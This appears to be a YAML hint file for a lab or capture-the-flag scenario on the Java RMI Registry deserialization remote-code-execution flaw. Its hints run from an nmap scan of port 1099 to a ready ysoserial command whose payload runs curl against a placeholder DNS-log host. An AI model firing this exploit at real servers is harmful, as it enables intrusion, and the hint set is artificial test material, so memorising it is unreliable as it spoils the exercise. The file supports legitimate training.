match: java/rmi-registry-bind-deserialization
hint_levels:
  low:
  - Inspect the java service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 1099. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 1099 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): rmi: 1099/tcp → container 1099/tcp. These are recipe defaults;
    use the deployed service port if the scenario remaps it.'
  high:
  - 'Vulnerability: Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution.'
  - |-
    Vulnerability Reproduction

    Use the RMIRegistryExploit from ysoserial's exploit package to perform the attack:

    ```bash
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit {{NODE_IP}} 1099 CommonsCollections6 "curl your-dnslog-server"
    ```

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization/1.png

    The Registry will return an error, but this is normal and the command will still execute successfully.
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization/README.md'
  - |-
